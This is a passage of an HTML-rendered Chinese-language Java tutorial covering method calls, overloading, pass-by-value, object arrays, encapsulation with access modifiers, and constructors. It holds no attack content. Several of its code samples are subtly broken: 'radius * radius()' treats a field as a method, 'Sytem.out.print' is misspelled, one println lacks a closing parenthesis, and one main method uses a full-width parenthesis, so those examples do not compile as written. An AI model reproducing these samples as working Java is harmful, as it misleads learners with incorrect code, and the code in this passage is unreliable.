class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//本类同级别方法调用：直接调用</span></span><br><span class="line">【变量 = 】 方法名(【实参列表】);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在其他类的方法中调用</span></span><br><span class="line">【变量 = 】 对象名.方法名(【实参列表】);</span><br></pre></td></tr></table></figure><p>（1）是否传实参</p><p>看被调用的方法是否有形参</p><p>（2）是否接收返回值</p><p>看被调用的方法是否是void，如果是void，就不需要也不能接收，如果不是void，就可以接收。</p><p>3、方法的声明与调用的代码示例</p><p>（1）无参无返回值方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//本类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Circle</span></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> radius;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">printInfo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"半径："</span> + radius);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        printInfo();<span class="comment">//本类中调用无参无返回值方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//其他类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Circle</span></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> radius;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">printInfo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"半径："</span> + radius);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestCircle</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Circle c1 = <span class="keyword">new</span> Circle();</span><br><span class="line">        c1.printInfo(); <span class="comment">//其他类中调用无参无返回值方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（2）无参有返回值方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//本类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Circle</span></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> radius;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">getArea</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">3.14</span> * radius * radius();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">printInfo</span><span class="params">()</span></span>&#123;</span><br><span class="line">      <span class="comment">//  System.out.println("半径：" + radius + "，面积：" + getArea());//本类中调用无参有返回值</span></span><br><span class="line">       <span class="keyword">double</span> area = getArea();<span class="comment">//本类中调用无参有返回值</span></span><br><span class="line">        System.out.println(<span class="string">"半径："</span> + radius + <span class="string">"，面积："</span> + area);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//其他类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Circle</span></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> radius;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">getArea</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">3.14</span> * radius * radius();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestCircle</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Circle c1 = <span class="keyword">new</span> Circle();</span><br><span class="line">        <span class="keyword">double</span> area = c1.getArea();</span><br><span class="line">        System.out.println(<span class="string">"面积："</span> + area);</span><br><span class="line">        <span class="comment">//或</span></span><br><span class="line">        System.out.println(<span class="string">"面积："</span> + c1.getArea());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（3）有参无返回值方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//本类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GraphicTools</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">printRectange</span><span class="params">(<span class="keyword">int</span> line, <span class="keyword">int</span> column, <span class="keyword">char</span> sign)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=line; i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>; j&lt;=column; j++)&#123;</span><br><span class="line">                Sytem.out.print(sign);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        printRectange(<span class="number">5</span>,<span class="number">10</span>,<span class="string">'%'</span>);<span class="comment">//本类中调用有参无返回值方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//其他类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GraphicTools</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">printRectange</span><span class="params">(<span class="keyword">int</span> line, <span class="keyword">int</span> column, <span class="keyword">char</span> sign)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=line; i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>; j&lt;=column; j++)&#123;</span><br><span class="line">                Sytem.out.print(sign);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        GraphicTools tools = <span class="keyword">new</span> GraphicTools();</span><br><span class="line">        tools.printRectange(<span class="number">5</span>,<span class="number">10</span>,<span class="string">'%'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（4）有参有返回值方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//本类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyMath</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a+b;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> x = <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">int</span> y = <span class="number">7</span>;</span><br><span class="line">        System.out.println(x + <span class="string">"+"</span> + y + <span class="string">"="</span> + sum(x,y);<span class="comment">//本类中调用有参有返回值的方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//其他类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyMath</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a+b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        MyMath my = <span class="keyword">new</span> MyMath();</span><br><span class="line">        <span class="keyword">int</span> x = <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">int</span> y = <span class="number">7</span>;</span><br><span class="line">        </span><br><span class="line">        System.out.println(x + <span class="string">"+"</span> + y + <span class="string">"="</span> + my.sum(x,y));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4、方法声明与调用的原则</p><p>（1）方法必须先声明后调用</p><blockquote><p>如果调用方法时，如果方法名写错或调用一个不存在的方法，编译会报错</p></blockquote><p>（2）方法声明的位置必须在类中方法外</p><p>正确示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">类&#123;</span><br><span class="line">    方法<span class="number">1</span>()&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    方法<span class="number">2</span>()&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>错误示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">类&#123;</span><br><span class="line">    方法<span class="number">1</span>()&#123;</span><br><span class="line">        方法<span class="number">2</span>()&#123;  <span class="comment">//错误</span></span><br><span class="line">        </span><br><span class="line">   &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（3）方法的调用的位置有要求</p><p>正确示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">类&#123;</span><br><span class="line">    方法<span class="number">1</span>()&#123;</span><br><span class="line">        调用方法</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>错误示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">类&#123;</span><br><span class="line">    方法<span class="number">1</span>()&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    调用方法  <span class="comment">//错误位置</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（4）方法的调用格式要与方法的声明格式对应</p><p>①是否要加“对象.”：看是否在本类中，还是其他类中</p><p>②是否要接收返回值：看被调用方法是否是void</p><p>③是否要传实参：看被调用方法是有形参列表</p><h3 id="5-4-3-方法的重载Overload"><a href="#5-4-3-方法的重载Overload" class="headerlink" title="5.4.3 方法的重载Overload"></a>5.4.3 方法的重载Overload</h3><p>概念：在同一个类中，出现了两个或多个的方法，它们的方法名称相同，形参列表不同，这样的形式称为方法的重载。和返回值类型无关。</p><p>示例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//求两个整数的最大值</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">max</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a&gt;b?a:b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//求三个整数的最大值</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">max</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> max(max(a,b),c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//求两个小数的最大值</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">max</span><span class="params">(<span class="keyword">double</span> a, <span class="keyword">double</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a&gt;b?a:b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-4-4-方法的参数传递机制"><a href="#5-4-4-方法的参数传递机制" class="headerlink" title="5.4.4 方法的参数传递机制"></a>5.4.4 方法的参数传递机制</h3><p>Java中方法的参数传递机制：值传递</p><p>（1）形参是基本数据类型时，实参给形参传递数据值，是copy的形式，形参对值的修改不影响实参。<br>（2）形参是引用数据类型时，实参给形参传递地址值，形参对对象的属性的修改，会影响实参对象的属性值，因为此时形参和实参就是指向同一个对象。<br>示例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> temp = a;</span><br><span class="line">        a = b;</span><br><span class="line">        b = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main（String[] args)&#123;</span><br><span class="line">        <span class="keyword">int</span> x = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> y = <span class="number">2</span>;</span><br><span class="line">        swap(x,y);<span class="comment">//调用完之后，x与y的值不变</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">change</span><span class="params">(MyData my)</span></span>&#123;</span><br><span class="line">        my.num *= <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        MyData m = <span class="keyword">new</span> MyData();</span><br><span class="line">        m.num = <span class="number">1</span>;</span><br><span class="line">        </span><br><span class="line">        change(m);<span class="comment">//调用完之后，m对象的num属性值就变为2</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyData</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> num;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>陷阱1：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">陷阱1：在方法中，形参 = 新new对象，那么就和实参无关了</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">change</span><span class="params">(MyData my)</span></span>&#123;</span><br><span class="line">        my = <span class="keyword">new</span> MyData();<span class="comment">//形参指向了新对象</span></span><br><span class="line">        my.num *= <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        MyData m = <span class="keyword">new</span> MyData();</span><br><span class="line">        m.num = <span class="number">1</span>;</span><br><span class="line">        </span><br><span class="line">        change(m);<span class="comment">//调用完之后，m对象的num属性值仍然为1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyData</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> num;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>陷阱2：见字符串和包装类部分</p><h2 id="5-3-对象数组"><a href="#5-3-对象数组" class="headerlink" title="5.3 对象数组"></a>5.3 对象数组</h2><p>一维数组：</p><p>1、元素是基本数据类型</p><p>2、元素是引用数据类型，也称为对象数组，即数组的元素是对象</p><blockquote><p>注意：对象数组，首先要创建数组对象本身，即确定数组的长度，然后再创建每一个元素对象，如果不创建，数组的元素的默认值就是null，所以很容易出现空指针异常NullPointerException。</p></blockquote><p>示例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyDate</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> year;</span><br><span class="line"><span class="keyword">int</span> month;</span><br><span class="line"><span class="keyword">int</span> day;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        MyDate[] arr = <span class="keyword">new</span> MyDate[<span class="number">3</span>];<span class="comment">//创建数组对象本身，指定数组的长度</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;arr.length; i++)&#123;</span><br><span class="line">            arr[i] = <span class="keyword">new</span> MyDate();<span class="comment">//每一个元素要创建对象</span></span><br><span class="line">            arr[i].year = <span class="number">1990</span> + i;</span><br><span class="line">            arr[i].month = <span class="number">1</span> + i;</span><br><span class="line">            arr[i].day = <span class="number">1</span> + i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对象数组的内存图：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="imgs/1558745138315.png" alt="1558745138315" title>                </div>                <div class="image-caption">1558745138315</div>            </figure><h1 id="第六章-面向对象的基本特征"><a href="#第六章-面向对象的基本特征" class="headerlink" title="第六章 面向对象的基本特征"></a>第六章 面向对象的基本特征</h1><p>面向对象的基本特征：</p><p>1、封装</p><p>2、继承</p><p>3、多态</p><h2 id="6-1-封装"><a href="#6-1-封装" class="headerlink" title="6.1 封装"></a>6.1 封装</h2><p>1、好处：</p><p>（1）隐藏实现细节，方便使用者使用</p><p>（2）安全，可以控制可见范围</p><p>2、如何实现封装？</p><p>通过权限修饰符</p><blockquote><p>面试题：请按照可见范围从小到大（从大到小）列出权限修饰符？</p></blockquote><table><thead><tr><th>修饰符</th><th>本类</th><th>本包</th><th>其他包的子类</th><th>任意位置</th></tr></thead><tbody><tr><td>private</td><td>√</td><td>×</td><td>×</td><td>×</td></tr><tr><td>缺省</td><td>√</td><td>√</td><td>×</td><td>×</td></tr><tr><td>protected</td><td>√</td><td>√</td><td>√</td><td>×</td></tr><tr><td>public</td><td>√</td><td>√</td><td>√</td><td>√</td></tr></tbody></table><p>权限修饰符可以修饰什么？</p><p>类（类、接口等）、属性、方法、构造器、内部类</p><p>类（外部类）：public和缺省</p><p>属性：4种</p><p>方法：4种</p><p>构造器：4种</p><p>内部类：4种</p><p>3、通常属性的封装是什么样的？</p><p>当然属性的权限修饰符可以是private、缺省、protected、public。但是我们大多数时候，见到的都是private，然后给它们配上get/set方法。</p><p>示例代码：标准Javabean的写法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="comment">//属性私有化</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> marry;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//公共的get/set</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String n)</span></span>&#123;</span><br><span class="line">        name = n;<span class="comment">//这里因为还没有学习this等，可能还会优化</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> a)</span></span>&#123;</span><br><span class="line">        age = a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMarry</span><span class="params">(<span class="keyword">boolean</span> m)</span></span>&#123;</span><br><span class="line">        marry = m;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isMarry</span><span class="params">()</span></span>&#123;<span class="comment">//boolean类型的属性的get方法，习惯使用把get换成is</span></span><br><span class="line">        <span class="keyword">return</span> marry;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6-2-构造器"><a href="#6-2-构造器" class="headerlink" title="6.2 构造器"></a>6.2 构造器</h2><p>1、构造器的作用：<br>（1）和new一起使用创建对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//调用无参构造创建对象</span></span><br><span class="line">类名 对象名 = <span class="keyword">new</span> 类名();</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用有参构造创建对象</span></span><br><span class="line">类名 对象名 = <span class="keyword">new</span> 类名(实参列表);</span><br></pre></td></tr></table></figure><p>（2）可以在创建对象的同时为属性赋值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Circle</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">double</span> radius;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Circle</span><span class="params">()</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Circle</span><span class="params">(<span class="keyword">double</span> r)</span></span>&#123;</span><br><span class="line">        radius = r;<span class="comment">//为radius赋值</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2、声明构造器的语法格式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span 